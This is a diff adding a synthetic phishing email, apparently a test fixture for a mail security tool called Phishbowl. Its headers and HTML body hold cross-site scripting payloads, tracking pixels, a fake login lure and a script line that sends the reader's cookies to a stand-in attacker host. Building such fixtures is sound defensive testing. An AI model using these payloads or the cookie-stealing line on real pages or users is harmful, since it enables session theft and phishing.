@@ -1,0 +1,50 @@
+Return-Path: <bounce@evil.example>
+Received: from attacker.evil.example (attacker.evil.example [203.0.113.66])
+	by mx.example.org (Postfix) with ESMTP id XSS001
+	for <victim@example.org>; Thu, 04 Jun 2026 09:00:00 +0000 (UTC)
+Authentication-Results: mx.example.org;
+	spf=fail smtp.mailfrom=evil.example;
+	dkim=none;
+	dmarc=fail (p=reject) header.from=evil.example
+From: "IT Support <script>alert('from')</script>" <support@evil.example>
+Reply-To: <recovery@reply-catcher.example>
+To: "Victim" <victim@example.org>
+Subject: <script>alert('subject-xss')</script><img src="http://tracker.evil.example/beacon.gif" onerror="alert(1)"> URGENT verify http://evil.example/login
+Date: Thu, 04 Jun 2026 09:00:00 +0000
+Message-ID: <20260604090000.0001@evil.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="xss-boundary-0001"
+
+This is a multi-part message in MIME format.
+--xss-boundary-0001
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+SYNTHETIC hostile-content sample for Phishbowl's security tests. All values use
+RFC 2606 / RFC 5737 reserved ranges and nothing here is ever fetched.
+
+Please verify your account: http://evil.example/login?token=abcd
+Or call our IP directly at 203.0.113.66.
+<script>alert('plaintext-script')</script>
+Contact us at "><svg/onload=alert(2)> support@evil.example
+--xss-boundary-0001
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>document.location='http://evil.example/steal?c='+document.cookie;</script>
+    <style>body { background: url('http://tracker.evil.example/bg.png'); }</style>
+  </head>
+  <body onload="alert('body-onload')">
+    <h1 style="color:red" onclick="alert('h1')">URGENT: verify your account NOW</h1>
+    <img src="http://tracker.evil.example/open.gif" width="1" height="1" onerror="alert('img')">
+    <iframe src="http://evil.example/frame"></iframe>
+    <p>Click <a href="javascript:alert('link')">here</a> or
+       <a href="http://evil.example/login?token=abcd">verify now</a>.</p>
+    <svg onload="alert('svg')"></svg>
+    <link rel="stylesheet" href="http://tracker.evil.example/style.css">
+  </body>
+</html>
+--xss-boundary-0001--
